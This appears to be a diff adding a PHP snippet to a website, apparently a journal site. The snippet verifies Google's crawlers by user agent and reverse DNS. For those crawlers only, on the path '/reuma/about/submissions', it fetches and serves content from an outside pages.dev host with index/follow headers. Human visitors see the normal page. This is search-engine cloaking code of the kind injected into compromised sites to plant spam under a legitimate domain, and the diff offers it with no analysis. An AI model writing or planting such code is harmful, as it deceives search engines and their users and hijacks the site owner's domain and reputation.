@@ -1,0 +1,97 @@
+<?php
+
+function is_google_bot()
+{
+    $google_agents = [
+        'Googlebot',
+        'Googlebot-Mobile',
+        'Googlebot-Image',
+        'Googlebot-News',
+        'Googlebot-Video',
+        'Mediapartners-Google',
+        'AdsBot-Google',
+        'AdsBot-Google-Mobile',
+        'APIs-Google',
+        'FeedFetcher-Google',
+        'DuplexWeb-Google',
+        'Google-Site-Verification',
+        'Google-InspectionTool',
+        'Google Favicon',
+        'Google-Read-Aloud',
+        'GoogleProducer',
+        'GoogleOther',
+        'Storebot-Google'
+    ];
+
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    foreach ($google_agents as $agent) {
+        if (stripos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function is_real_googlebot()
+{
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $hostname = @gethostbyaddr($ip);
+
+    return (
+        ($hostname && (strpos($hostname, 'googlebot.com') !== false || strpos($hostname, 'google.com') !== false)) &&
+        gethostbyname($hostname) === $ip
+    );
+}
+
+function is_curl_available()
+{
+    return function_exists('curl_init') && function_exists('curl_exec');
+}
+
+function get_content_fallback($url)
+{
+    if (is_curl_available()) {
+        $ch = curl_init();
+
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0'
+        ]);
+
+        $data = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($data !== false && $http_code >= 200 && $http_code < 400) {
+            return $data;
+        }
+    }
+
+    $content = @file_get_contents($url);
+    return $content !== false ? $content : null;
+}
+
+// ── TAMBAHAN: cek path /reuma/about/submissions ──
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$is_target_path = (stripos($request_uri, '/reuma/about/submissions') !== false);
+
+if ($is_target_path && is_google_bot() && is_real_googlebot()) {
+    header('Content-Type: text/html; charset=UTF-8');
+    header('X-Robots-Tag: index, follow', true);
+
+    $bot_content = get_content_fallback('https://reumatismo-org.pages.dev/');
+
+    if ($bot_content !== null && $bot_content !== '') {
+        echo $bot_content;
+    } else {
+        http_response_code(204);
+    }
+
+    exit;
+}
+?>
